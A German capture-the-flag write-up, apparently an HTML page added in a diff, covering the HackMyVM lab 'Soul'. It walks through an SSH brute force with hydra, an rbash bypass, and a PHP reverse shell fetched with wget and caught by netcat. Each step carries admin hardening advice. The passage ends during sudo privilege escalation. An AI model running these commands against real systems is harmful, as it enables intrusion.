@@ -1,0 +1,793 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Soul - HackMyVM - Bericht</title> <!-- Titel angepasst -->
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css"> <!-- Pfad ggf. anpassen -->
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ <div class="nav-wrapper">
+    <div class="hamburger-nav-wrapper">
+        <input type="checkbox" id="hamburger-toggle">
+        <label id="hamburger-button" for="hamburger-toggle" aria-label="Menü öffnen">
+            <div class="bar"></div>
+            <div class="bar"></div>
+            <div class="bar"></div>
+        </label>
+
+        <nav class="navbar" id="main-nav">
+            <a href="../../aboutme.html">Über mich</a> <!-- Pfad ggf. anpassen -->
+            <a href="../../index.html">HackMyVM</a> <!-- Pfad ggf. anpassen -->
+            <a href="../../vulnyx.html">Vulnyx</a> <!-- Pfad ggf. anpassen -->
+            <a href="../../vulnhub.html">Vulnhub</a> <!-- Pfad ggf. anpassen -->
+        </nav>
+  </div></div>
+    <div class="header-bg">
+        <!-- Titel und Schwierigkeitsgrad angepasst -->
+        <h1>Soul - HackMyVM - Level: Hard - Bericht</h1>
+        <div class="level-container">
+            <!-- Klasse für Hard gesetzt -->
+            <h2 class="level-hard">Hard</h2>
+            <div class="circle">
+                <!-- Farben werden durch CSS für .level-hard gesteuert -->
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <!-- Liste der verwendeten Tools basierend auf dem Text -->
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">vi</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">wget</div>
+                <div class="tool-item">stegseek</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">steghide</div>
+                <div class="tool-item">hydra</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">echo</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">grep</div>
+                <div class="tool-item">cp</div>
+                <div class="tool-item">python3</div>
+                <div class="tool-item">nc (netcat)</div>
+                <div class="tool-item">export</div>
+                <div class="tool-item">stty</div>
+                <div class="tool-item">fg</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">chmod</div>
+                <div class="tool-item">bash</div>
+                <div class="tool-item">hping3</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">agetty</div>
+                <div class="tool-item">id</div>
+                <div class="tool-item">cd</div>
+                <div class="tool-item">pwd</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <!-- Inhaltsverzeichnis angepasst -->
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web/Service Enumeration</a>
+                    <ul>
+                        <li><a href="#enum-http80">Port 80 (Nginx)</a></li>
+                        <li><a href="#enum-stego">Steganographie</a></li>
+                    </ul>
+                </li>
+                <li><a href="#initial-access">Initial Access (POC - SSH Brute Force)</a>
+                    <ul>
+                        <li><a href="#init-rbash">rbash Bypass</a></li>
+                        <li><a href="#init-nginx">Nginx Konfiguration & PHP Upload</a></li>
+                        <li><a href="#init-www-data">Shell als www-data</a></li>
+                    </ul>
+                </li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a>
+                    <ul>
+                        <li><a href="#privesc-gabriel">POC: Eskalation zu gabriel (sudo /tmp/whoami)</a></li>
+                        <li><a href="#privesc-peter">POC: Eskalation zu peter (sudo hping3)</a></li>
+                        <li><a href="#privesc-root">POC: Eskalation zu root (SUID agetty)</a></li>
+                    </ul>
+                </li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+<span class="command">192.168.2.152	08:00:27:0c:b9:aa	PCS Systemtechnik GmbH</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">
+                **Analyse:** Der Befehl `arp-scan -l` wird genutzt, um aktive Geräte im lokalen Netzwerk zu entdecken. Ein Host mit der IP `192.168.2.152` wird gefunden. Die zugehörige MAC-Adresse `08:00:27:0c:b9:aa` weist auf eine VirtualBox-VM hin ("PCS Systemtechnik GmbH" ist der OUI-Besitzer für VirtualBox).
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Das Zielsystem wurde erfolgreich im Netzwerk identifiziert. Die IP `192.168.2.152` ist der Ausgangspunkt für weitere Scans.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Die IP `192.168.2.152` im nächsten Schritt mit Nmap scannen.<br>
+                **Empfehlung (Admin):** Regelmäßige Netzwerkscans durchführen, um nicht autorisierte Geräte zu identifizieren. Netzwerksegmentierung kann die Sichtbarkeit von Geräten einschränken.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -T5 -sV -A 192.168.2.152 -p-</span></div>
+                    <pre>
+Starting Nmap 7.93 ( https://nmap.org ) at 2022-10-17 06:18 CEST
+Nmap scan report for soul (<span class="command">192.168.2.152</span>)
+Host is up (0.00013s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+<span class="command">22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span>
+| ssh-hostkey:
+|   2048 8a:e9:c1:c2:a3:44:40:26:6f:22:37:c3:fe:a1:19:f2 (RSA)
+|   256 4f:4a:d6:47:1a:87:7e:69:86:7f:5e:11:5c:4f:f1:48 (ECDSA)
+|_  256 46:f4:2c:28:53:ef:4c:2b:70:f8:99:7e:39:64:ec:07 (ED25519)
+<span class="command">80/tcp open  http    nginx 1.14.2</span>
+|_http-title: Site doesn't have a title (text/html).
+|_http-server-header: nginx/1.14.2
+MAC Address: <span class="command">08:00:27:0C:B9:AA</span> (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: <span class="command">Linux 4.X|5.X</span>
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: <span class="command">Linux 4.15 - 5.6</span>
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.13 ms soul (<span class="command">192.168.2.152</span>)
+
+[...]
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">
+                **Analyse:** Ein umfassender Nmap-Scan (`-sS -sC -sV -A -p-`) auf `192.168.2.152` (Host `soul`) zeigt zwei offene TCP-Ports:
+                *   **Port 22 (SSH):** OpenSSH 7.9p1 auf Debian 10. Erfordert Authentifizierung.
+                *   **Port 80 (HTTP):** Nginx 1.14.2. Der Titel fehlt, was auf eine einfache oder fehlerhafte Seite hindeutet.
+                Das Betriebssystem wird als Linux (Debian) bestätigt.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Die Angriffsfläche ist klein. Der Webserver auf Port 80 ist der primäre Ansatzpunkt. SSH ist vorhanden, benötigt aber Zugangsdaten.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):**
+                1.  **Port 80:** Mit `gobuster` oder ähnlichen Tools nach versteckten Verzeichnissen und Dateien suchen. Die Webseite manuell im Browser untersuchen.
+                2.  **SSH:** Vorerst zurückstellen, bis mögliche Benutzernamen oder Passwörter gefunden werden.<br>
+                **Empfehlung (Admin):**
+                1.  **Nginx (Port 80):** Sicherstellen, dass die Nginx-Konfiguration sicher ist und keine sensiblen Informationen preisgibt. Nginx aktuell halten. Wenn die Webseite nicht aktiv genutzt wird, den Dienst deaktivieren.
+                2.  **SSH:** Standard-Härtung anwenden (starke Passwörter/Keys, Fail2ban, Zugriffsbeschränkungen).
+            </p>
+        </section>
+
+        <section id="web-enumeration">
+             <h2>Web/Service Enumeration</h2>
+
+             <h3 id="enum-http80">Port 80 (Nginx)</h3>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://192.168.2.152/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e -x .git,php,html,xml,zip,7z,tar,bak,sql,py,pl,txt,jpg,jpeg,png,js,aac,ogg,flac,alac,wav,aiff,dsd,mp3,.bck,mp4,mkv -t 100 -e -s "200,204,301,302,307,401" | grep -v "Size: 0"</span></div>
+                     <pre>
+===============================================================
+Gobuster v3.5
+[...]
+===============================================================
+2022/10/17 12:24:01 Starting gobuster in directory enumeration mode
+===============================================================
+/<span class="command">index.html</span>           (Status: 200) [Size: 24]
+/<span class="command">robots.txt</span>           (Status: 200) [Size: 9]
+/<span class="command">saint.jpg</span>            (Status: 200) [Size: 190523]
+
+===============================================================
+2022/10/17 12:24:48 Finished
+===============================================================
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis">
+                 **Analyse:** `gobuster` wird auf Port 80 ausgeführt. Es findet drei Dateien:
+                 *   `/index.html`: Eine sehr kleine Datei (24 Bytes).
+                 *   `/robots.txt`: Existiert und ist zugänglich (Status 200).
+                 *   `/saint.jpg`: Eine relativ große Bilddatei (186 KB).
+             </p>
+             <p class="evaluation">
+                 **Bewertung:** Die `index.html` ist wahrscheinlich leer oder enthält nur minimale Informationen. Die `robots.txt` sollte auf interessante Einträge geprüft werden. Die Bilddatei `saint.jpg` ist verdächtig, da sie für eine einfache Webseite ungewöhnlich ist und möglicherweise versteckte Daten (Steganographie) enthält.
+             </p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">vi /etc/hosts</span></div>
+                     <pre>
+127.0.0.1	 localhost
+127.0.1.1  	 cyber
+
+<span class="command">192.168.2.152    soul.hmv</span>
+
+# The following lines are desirable for IPv6 capable hosts
+::1     localhost ip6-localhost ip6-loopback
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis">
+                 **Analyse:** Der Hostname `soul.hmv` wird der lokalen `/etc/hosts`-Datei hinzugefügt und auf die IP `192.168.2.152` gemappt. Dies geschieht oft, um Webanwendungen anzusprechen, die auf Hostnamen basierende virtuelle Hosts verwenden.
+             </p>
+             <p class="evaluation">
+                 **Bewertung:** Standardvorgehen, um die Namensauflösung sicherzustellen.
+             </p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl http://192.168.2.152/robots.txt</span></div>
+                     <pre>
+<span class="command">/nothing</span>
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis">
+                 **Analyse:** Der Inhalt der `/robots.txt` wird abgerufen. Sie enthält nur den Eintrag `/nothing`.
+             </p>
+             <p class="evaluation">
+                 **Bewertung:** Der Eintrag `/nothing` könnte ein verstecktes Verzeichnis oder eine Datei sein, die für Suchmaschinen gesperrt ist, aber für einen Angreifer interessant sein könnte. Es könnte aber auch eine Sackgasse oder ein Trollversuch sein.
+             </p>
+             <p class="recommendation">
+                 **Empfehlung (Pentester):** Versuchen, `http://soul.hmv/nothing` oder `http://192.168.2.152/nothing` im Browser oder mit `curl` aufzurufen. Wenn es ein Verzeichnis ist, mit `gobuster` weiter untersuchen.<br>
+                 **Empfehlung (Admin):** `robots.txt` sollte keine sensitiven Pfade enthalten. Pfade, die wirklich nicht öffentlich zugänglich sein sollen, müssen serverseitig geschützt werden (z.B. durch Zugriffskontrollen in Nginx).
+             </p>
+
+            <h3 id="enum-stego">Steganographie</h3>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wget http://192.168.2.152/saint.jpg</span></div>
+                     <pre>
+--2022-10-17 12:25:30--  http://192.168.2.152/saint.jpg
+[...]
+<span class="password">2022-10-17 12:25:30 (45.3 MB/s) - saint.jpg gespeichert [190523/190523]</span>
+                     </pre>
+                 </div>
+            </div>
+            <p class="analysis">
+                 **Analyse:** Die Bilddatei `saint.jpg` wird von Port 80 heruntergeladen.
+            </p>
+             <p class="evaluation">
+                 **Bewertung:** Die Datei steht nun für lokale Analyse bereit.
+            </p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">stegseek saint.jpg /usr/share/wordlists/rockyou.txt</span></div>
+                     <pre>
+StegSeek 0.6 - https://github.com/RickdeJager/StegSeek
+
+<span class="password">[i] Found passphrase: ""</span>
+<span class="password">[i] Original filename: "pass.txt".</span>
+<span class="password">[i] Extracting to "saint.jpg.out".</span>
+                     </pre>
+                 </div>
+            </div>
+             <p class="analysis">
+                **Analyse:** Das Tool `stegseek` wird verwendet, um zu versuchen, mit `steghide` versteckte Daten aus `saint.jpg` zu extrahieren. Es testet Passphrasen aus der `rockyou.txt`-Wortliste. `stegseek` findet erfolgreich Daten, die mit einer **leeren Passphrase** (`""`) versteckt wurden. Die ursprüngliche Datei hieß `pass.txt` und wird als `saint.jpg.out` extrahiert.
+            </p>
+             <p class="evaluation">
+                **Bewertung:** Erfolg bei der Steganographie-Analyse! Versteckte Daten wurden gefunden. Die Verwendung einer leeren Passphrase ist extrem unsicher.
+            </p>
+             <p class="recommendation">
+                **Empfehlung (Pentester):** Den Inhalt der extrahierten Datei `saint.jpg.out` untersuchen.<br>
+                **Empfehlung (Admin):** Steganographie kann zur Datenexfiltration oder zum Verstecken von Malware/Credentials verwendet werden. Inhalte, die ins Netz hochgeladen oder aus dem Netz heruntergeladen werden, sollten ggf. auf versteckte Daten geprüft werden. Sensible Daten niemals mittels Steganographie mit schwachen/leeren Passphrasen schützen.
+            </p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">cat saint.jpg.out</span></div>
+                     <pre>
+<span class="password">lionsarebigcats</span>
+                    </pre>
+                 </div>
+             </div>
+             <p class="analysis">
+                **Analyse:** Der Inhalt der extrahierten Datei `saint.jpg.out` ist der String `lionsarebigcats`.
+            </p>
+             <p class="evaluation">
+                **Bewertung:** Dies ist höchstwahrscheinlich ein Passwort.
+            </p>
+             <p class="recommendation">
+                **Empfehlung (Pentester):** Das gefundene Passwort `lionsarebigcats` für den SSH-Login (Port 22) testen, möglicherweise in Kombination mit gängigen Benutzernamen oder Namen, die sich aus dem Kontext ergeben (z.B. `daniel`, `soul`).<br>
+                **Empfehlung (Admin):** Das Passwort `lionsarebigcats` ist relativ schwach und sollte auf keinem System verwendet werden.
+            </p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">steghide --extract -sf saint.jpg</span></div>
+                     <pre>
+Passwort eingeben: <span class="password">lionsarebigcats</span>
+<span class="password">steghide: Mit diesem Passwort konnten keine Daten extrahiert werden!</span>
+                    </pre>
+                 </div>
+             </div>
+             <p class="analysis">
+                 **Analyse:** Ein Versuch, `steghide` direkt mit dem Passwort `lionsarebigcats` zu verwenden, schlägt fehl.
+            </p>
+             <p class="evaluation">
+                 **Bewertung:** Bestätigt, dass die Daten mit einer leeren Passphrase versteckt wurden und `lionsarebigcats` der *Inhalt* der versteckten Datei ist, nicht die Passphrase selbst.
+            </p>
+        </section>
+
+        <section id="initial-access">
+             <h2>Initial Access (POC - SSH Brute Force)</h2>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">hydra -L /usr/share/seclists/Usernames/Names/names.txt -p lionsarebigcats -t 64 192.168.2.152 ssh -F</span></div>
+                      <pre>
+Hydra v9.4 (c) 2022 by van Hauser/THC [...]
+[...]
+[DATA] max 64 tasks per 1 server, overall 64 tasks, 10177 login tries (l:10177/p:1), ~160 tries per task
+[DATA] attacking ssh://192.168.2.152:22/
+[...]
+<span class="password">[22][ssh] host: 192.168.2.152   login: daniel   password: lionsarebigcats</span>
+[...]
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis">
+                **Analyse:** `hydra` wird verwendet, um einen SSH-Login auf `192.168.2.152` zu erzwingen.
+                *   `-L ...names.txt`: Verwendet eine Liste gängiger Vornamen als Benutzernamen.
+                *   `-p lionsarebigcats`: Verwendet das gefundene Passwort.
+                *   `-t 64`: Setzt die Anzahl der parallelen Tasks (hoch).
+                *   `ssh`: Gibt das Zielprotokoll an.
+                *   `-F`: Beendet Hydra, sobald ein gültiges Login gefunden wurde.
+                Hydra findet erfolgreich die Kombination `daniel` / `lionsarebigcats`.
+            </p>
+             <p class="evaluation">
+                **Bewertung:** Die Kombination aus dem durch Steganographie gefundenen Passwort und einem gängigen Benutzernamen aus einer Liste führte zum Erfolg. Initial Access über SSH ist nun möglich.
+            </p>
+             <p class="recommendation">
+                **Empfehlung (Pentester):** Sich mit den gefundenen Credentials (`daniel:lionsarebigcats`) per SSH anmelden.<br>
+                **Empfehlung (Admin):** Passwortrichtlinien durchsetzen, die schwache Passwörter verbieten. Fail2ban oder ähnliche Tools zum Schutz vor Brute-Force-Angriffen einsetzen. Regelmäßig überprüfen, ob unbekannte Benutzerkonten existieren.
+            </p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh daniel@192.168.2.152</span></div>
+                      <pre>
+[...] Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '192.168.2.152' (ED25519) to the list of known hosts.
+daniel@192.168.2.152's password: <span class="password">lionsarebigcats</span>
+Linux soul 4.19.0-12-amd64 #1 SMP Debian 4.19.152-1 (2020-10-18) x86_64
+[...]
+Last login: Thu Nov 26 05:27:42 2020 from 192.168.1.58
+<span class="prompt">daniel@soul:~$</span>
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis">
+                **Analyse:** Der SSH-Login als `daniel` mit dem Passwort `lionsarebigcats` ist erfolgreich. Der Pentester erhält eine Shell.
+            </p>
+             <p class="evaluation">
+                **Bewertung:** Initial Access erfolgreich etabliert.
+            </p>
+
+             <h3 id="init-rbash">rbash Bypass</h3>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">daniel@soul:~$ <span class="command">echo $SHELL</span></div>
+                      <pre>
+<span class="command">/usr/bin/rbash</span>
+                     </pre>
+                 </div>
+             </div>
+              <p class="analysis">
+                 **Analyse:** Die Standard-Shell für `daniel` ist `/usr/bin/rbash` (Restricted Bash), was die verfügbaren Befehle einschränkt.
+             </p>
+              <p class="evaluation">
+                 **Bewertung:** Die Einschränkung muss umgangen werden, um effektiv arbeiten zu können.
+             </p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <!-- Erneuter SSH Login von lokal, um rbash zu umgehen -->
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh daniel@192.168.2.152 -t "bash --noprofile"</span></div>
+                     <pre>
+daniel@192.168.2.152's password: <span class="password">lionsarebigcats</span>
+<span class="prompt">daniel@soul:~$</span> <span class="comment"># Jetzt in einer vollen Bash-Shell</span>
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis">
+                 **Analyse:** Durch erneutes Verbinden per SSH mit der Option `-t "bash --noprofile"` wird direkt eine uneingeschränkte Bash-Shell gestartet, wodurch die `rbash`-Einschränkung umgangen wird.
+             </p>
+             <p class="evaluation">
+                 **Bewertung:** Erfolgreicher `rbash`-Bypass. Der Pentester hat nun eine voll funktionsfähige Shell als `daniel`.
+            </p>
+             <p class="recommendation">
+                 **Empfehlung (Pentester):** Mit der Enumeration als `daniel` beginnen.<br>
+                 **Empfehlung (Admin):** Wenn `rbash` als Sicherheitsmaßnahme gedacht ist, sicherstellen, dass Benutzer nicht einfach per SSH eine andere Shell anfordern können (z.B. durch Konfiguration in `sshd_config` oder durch Einschränkung der verfügbaren Befehle in `/etc/passwd`).
+             </p>
+
+             <h3 id="init-nginx">Nginx Konfiguration & PHP Upload</h3>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">daniel@soul:~$ <span class="command">ls -lah</span></div>
+                     <!-- Standard Home-Verzeichnis Inhalt -->
+                     <div class="prompt">daniel@soul:~$ <span class="command">cd /etc/nginx/sites-available</span></div>
+                     <div class="prompt">daniel@soul:/etc/nginx/sites-available$ <span class="command">ls</span></div>
+                      <pre>
+default
+                     </pre>
+                     <div class="prompt">daniel@soul:/etc/nginx/sites-available$ <span class="command">grep -Ev "^.*#|^$" default</span></div>
+                     <pre>
+server {
+	listen 80 default_server;
+	listen [::]:80 default_server;
+	root /var/www/html;
+	index index.html index.htm index.nginx-debian.html;
+	server_name _;
+	location / {
+		try_files $uri $uri/ =404;
+	}
+}
+server {
+	listen 80;
+	listen [::]:80;
+	<span class="command">server_name lonelysoul.hmv;</span>
+	root /var/www/html;
+	index index.html;
+	location / {
+		try_files $uri $uri/ =404;
+	}
+    <span class="command">location ~ \.php$ {</span>
+        <span class="command">include snippets/fastcgi-php.conf;</span>
+        <span class="command">fastcgi_pass unix:/run/php/php7.3-fpm.sock;</span>
+    <span class="command">}</span>
+}
+                     </pre>
+                 </div>
+             </div>
+              <p class="analysis">
+                 **Analyse:** Als `daniel` wird die Nginx-Konfigurationsdatei `/etc/nginx/sites-available/default` untersucht. Sie enthält zwei Server-Blöcke:
+                 1.  Der `default_server` für Anfragen ohne spezifischen Hostnamen oder an die IP direkt.
+                 2.  Ein zweiter Server-Block für den Hostnamen `lonelysoul.hmv`. Dieser Block ist wichtig, da er eine `location ~ \.php$`-Direktive enthält, die Anfragen an `.php`-Dateien an den PHP-FPM-Prozess (`php7.3-fpm.sock`) weiterleitet. Der Webroot für beide ist `/var/www/html`.
+             </p>
+             <p class="evaluation">
+                 **Bewertung:** Dies bestätigt, dass PHP-Skripte auf dem Server ausgeführt werden können, wenn sie über den Hostnamen `lonelysoul.hmv` aufgerufen werden. Dies eröffnet die Möglichkeit, eine PHP-Webshell oder Reverse Shell hochzuladen und auszuführen.
+            </p>
+             <p class="recommendation">
+                 **Empfehlung (Pentester):**
+                 1.  Den Hostnamen `lonelysoul.hmv` zur lokalen `/etc/hosts`-Datei hinzufügen (auf `192.168.2.152` zeigend).
+                 2.  Überprüfen, ob `daniel` Schreibrechte in `/var/www/html` hat.
+                 3.  Wenn ja, eine PHP-Reverse-Shell nach `/var/www/html` hochladen.
+                 4.  Einen Listener starten und die Shell über `http://lonelysoul.hmv/<shellname>.php` auslösen.<br>
+                 **Empfehlung (Admin):** Sicherstellen, dass der PHP-FPM-Prozess mit minimalen Rechten läuft (idealerweise als dedizierter Benutzer, nicht `www-data`, wenn möglich). Dateiberechtigungen im Webroot (`/var/www/html`) überprüfen; der Webserver-Prozess oder unprivilegierte Benutzer sollten dort keine Schreibrechte haben. Den virtuellen Host `lonelysoul.hmv` entfernen, wenn er nicht benötigt wird. PHP-FPM und Nginx sicher konfigurieren.
+             </p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                      <!-- Vorbereitung auf lokaler Maschine -->
+                    <div class="prompt">┌──(root㉿cyber)-[~/HackingTools]
+└─# <span class="command">cp /home/cyber/Downloads/rev.php .</span></div>
+                    <div class="prompt">┌──(root㉿cyber)-[~/HackingTools]
+└─# <span class="command">grep port rev.php</span></div>
+                    <pre>
+// This script will make an outbound TCP connection to a hardcoded IP and port.
+$port = <span class="command">9001</span>;       // CHANGE THIS
+$sock = fsockopen($ip, $port, $errno, $errstr, 30);
+printit("Successfully opened reverse shell to $ip:$port");
+                    </pre>
+                    <div class="prompt">┌──(root㉿cyber)-[~/HackingTools]
+└─# <span class="command">python3 -m http.server 80</span></div>
+                    <pre>
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+                    </pre>
+                 </div>
+            </div>
+            <p class="analysis">
+                 **Analyse:** Auf der lokalen Maschine wird eine PHP-Reverse-Shell-Datei (`rev.php`) vorbereitet. Der Code verwendet Port `9001`. Ein HTTP-Server wird gestartet, um die Datei für den Download bereitzustellen.
+            </p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                      <!-- Auf Zielmaschine als daniel -->
+                     <div class="prompt">daniel@soul:/var/www/html$ <span class="command">wget http://192.168.2.153/rev.php</span></div>
+                      <pre>
+--2022-10-17 06:50:25--  http://192.168.2.153/rev.php
+Connecting to 192.168.2.153:80... connected.
+[...]
+<span class="password">2022-10-17 06:50:25 (1.14 GB/s) - ‘rev.php’ saved [5495/5495]</span>
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis">
+                **Analyse:** Als Benutzer `daniel` wird die `rev.php`-Datei erfolgreich vom HTTP-Server des Angreifers nach `/var/www/html` heruntergeladen. Dies impliziert, dass `daniel` Schreibrechte in diesem Verzeichnis hat.
+            </p>
+             <p class="evaluation">
+                **Bewertung:** Die PHP-Shell ist nun auf dem Server platziert und kann über den `lonelysoul.hmv`-Vhost ausgeführt werden. Die Schreibrechte für `daniel` im Webroot sind eine Fehlkonfiguration.
+            </p>
+             <p class="recommendation">
+                **Empfehlung (Pentester):** Listener auf Port 9001 starten und `curl http://lonelysoul.hmv/rev.php` ausführen.<br>
+                **Empfehlung (Admin):** Berechtigungen für `/var/www/html` korrigieren. Nur der Administrator oder Deployment-Prozesse sollten dort Schreibrechte haben, nicht reguläre Benutzer.
+            </p>
+
+             <h3 id="init-www-data">Shell als www-data</h3>
+             <div class="code-block">
+                 <div class="terminal">
+                      <!-- Listener auf lokaler Maschine -->
+                    <div class="prompt">┌──(root㉿cyber)-[~/HackingTools]
+└─# <span class="command">nc -lvnp 9001</span></div>
+                    <pre>
+<span class="password">listening on [any] 9001 ...</span>
+                    </pre>
+                     <!-- Trigger auf lokaler Maschine -->
+                     <div class="prompt">┌──(root㉿cyber)-[~/HackingTools]
+└─# <span class="command">curl http://lonelysoul.hmv/rev.php</span></div>
+                     <!-- Keine direkte Ausgabe vom curl erwartet -->
+                 </div>
+             </div>
+              <p class="analysis">
+                 **Analyse:** Ein Netcat-Listener wird auf Port 9001 gestartet. Anschließend wird die PHP-Reverse-Shell durch Aufruf von `http://lonelysoul.hmv/rev.php` mit `curl` ausgelöst.
+             </p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                      <!-- Ausgabe im Listener -->
+                    <div class="prompt">┌──(root㉿cyber)-[~/HackingTools]
+└─# <span class="command">nc -lvnp 9001</span></div>
+                    <pre>
+<span class="password">listening on [any] 9001 ...</span>
+<span class="password">connect to [192.168.2.153] from (UNKNOWN) [192.168.2.152] 57384</span>
+Linux soul 4.19.0-12-amd64 #1 SMP Debian 4.19.152-1 (2020-10-18) x86_64 GNU/Linux
+[...]
+<span class="command">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span>
+/bin/sh: 0: can't access tty; job control turned off
+<span class="prompt">$</span> <span class="comment"># Shell als www-data erhalten!</span>
+                    </pre>
+                 </div>
+             </div>
+             <p class="analysis">
+                 **Analyse:** Der Listener empfängt die Verbindung. Die Shell läuft als Benutzer `www-data`, der Benutzer unter dem der PHP-FPM-Prozess ausgeführt wird.
+             </p>
+             <p class="evaluation">
+                 **Bewertung:** Eine zweite Shell auf dem System wurde erlangt, diesmal als `www-data`. Dies kann nützlich sein, um Aktionen durchzuführen, für die `www-data` möglicherweise Rechte hat, `daniel` aber nicht, oder um andere Web-bezogene Dateien zu untersuchen.
+             </p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Shell Upgrade in der www-data Shell -->
+                    <div class="prompt">$ <span class="command">python3 -c 'import pty;pty.spawn("/bin/bash")'</span></div>
+                     <div class="prompt">www-data@soul:/$ <span class="command">export TERM=xterm</span></div>
+                     <div class="prompt">www-data@soul:/$ <span class="comment"># Ctrl+Z</span></div>
+                      <!-- Lokale Shell -->
+                     <div class="prompt">┌──(root㉿cyber)-[~/HackingTools]
+└─# <span class="command">stty raw -echo;fg</span></div>
+                     <pre>
+[1]  + continued  nc -lvnp 9001
+                               reset
+<span class="prompt">www-data@soul:/$</span> <span class="comment"># Voll funktionsfähige Shell</span>
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis">
+                 **Analyse:** Die erhaltene `www-data`-Shell wird mittels Python und `stty` zu einer voll interaktiven TTY aufgewertet.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Die Shell ist nun stabiler und einfacher zu bedienen.
+            </p>
+
+            <h3 id="privesc-gabriel">POC: Eskalation zu gabriel (sudo /tmp/whoami)</h3>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">www-data@soul:/$ <span class="command">sudo -l</span></div>
+                      <pre>
+Matching Defaults entries for www-data on soul:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User www-data may run the following commands on soul:
+    <span class="command">(gabriel) NPASSWD: /tmp/whoami</span>
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis">
+                **Analyse:** `sudo -l` als `www-data` zeigt, dass dieser Benutzer den Befehl `/tmp/whoami` als Benutzer `gabriel` ohne Passwort ausführen darf.
+            </p>
+             <p class="evaluation">
